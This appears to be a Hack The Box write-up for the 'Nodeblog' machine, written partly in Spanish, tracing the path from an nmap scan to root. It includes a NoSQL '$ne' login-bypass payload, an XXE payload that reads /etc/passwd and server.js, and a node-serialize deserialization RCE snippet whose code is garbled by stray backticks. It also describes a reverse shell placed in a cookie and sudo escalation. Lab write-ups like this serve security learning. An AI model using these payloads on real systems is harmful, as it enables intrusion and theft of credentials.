---
title: Nodeblog Machine HTB
date: 2023-02-1 00:18:00 +0700
categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [machines]
---

## Enumeration 

```ruby
 # Nmap 7.93 scan initiated Mon Jan 30 12:46:50 2023 as: nmap -p22,5000 -sCV -oN targeted 10.129.96.160
 Nmap scan report for 10.129.96.160
 Host is up (0.049s latency).
 
 PORT STATE SERVICE VERSION
 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
 | ssh-hostkey: 
 | 3072 ea8421a3224a7df9b525517983a4f5f2 (RSA)
 |_ 256 b8399ef488beaa01732d10fb447f8461 (ECDSA)
 |_ 256 2221e9f48590908745161f733641ee3b32 (ED25519)
 5000/tcp open http Node.js (Express middleware)
 |_http-title: Blog
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let's investigate the web page. We see that we come to a log panel, which we are going to try to bypass using noSQL:
You can guess that the username is `admin` , so let's use `$ne` to bypass the password. So we change Content-Type to Json and send the following request:

```json
{"user": "admin", "password": {"$ne": "wrongpassword"}}
```

And we would be logged in.

## User Exploit

En la sección de upload, podemos subir archivos, asi que vamos a intentar subirle un archivo XXE para sacarle la información de /etc/passwd:

```html
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <title>title</title>
    <description>desc</description>
    <markdown>&xxe;</markdown>
</creds>
```

y vemos que funciona.

Como vimos en el nmap, esta node.js detrás, asi que vamos a buscar el archivo `server.js` para ello, en la petición de burp para hacer el login bypass, vamos a meterle un overload al payload jason usando `{}{}{}{}{}{}` y vemos que nos tira el siguiente eror: `&nbsp; &nbsp;at /opt/blog/node_modules/body-parser/lib/read. js:121:18<br>` y como ese mucho más, así que vamos a intentar buscar el archivo `server.js` dentro del directorio `/opt/blog/` usando el XXE y vemos que tenemos exito. 

Leyendo el codigo que nos reporta, vemos que tiene esta parte interesante:
```js
function authenticated(c) {
    if (typeof c == 'undefined')
        return false

    c = serialize.unserialize(c)

    if (c.sign == (crypto.createHash('md5').update(cookie_secret + c.user).digest('hex')) ){
        return true
    } else {
        return false
    }
}
```

But previously you have the following constant defined:
```js
const serialize = require('node-serialize')
```

Which serializes the data before sending it. However, this has an exploit, which we are going to use.
```node
``var` `y = {``
 ``rce :` `` `function``(){`
 `require(``'child_process'``).exec(``'ls /'``,` ` `function``(error, stdout, stderr) { console.log(stdout) });`
 `},`
`}`
`var` `serialize = require(```'node-serialize'``);``
`console.log(```"Serialized: ``+ serialize.serialize(y));``
```

Therefore, where the ls command is, we can inject another one, so let's create a file with a reverse shell, base it on base 64, and URL-encode it to finally put it in the session cookie. Finally, we do a reload and we have the reverse shell.

## Root Exploit

Doing a `ps -faux` we see that we have the port 27017 open, which is the one of mongo db, so we are going to connect using `mongo`. Once inside, we do `showdbs` and see several. Looking through them, we do a `show collections` and find the users table, finally we use `db.users.find()` and find the password of the admin user.

Finally, doing sudo -l we see that we can execute any command as root, so we do `sudo su` and we become root and send the flag. 
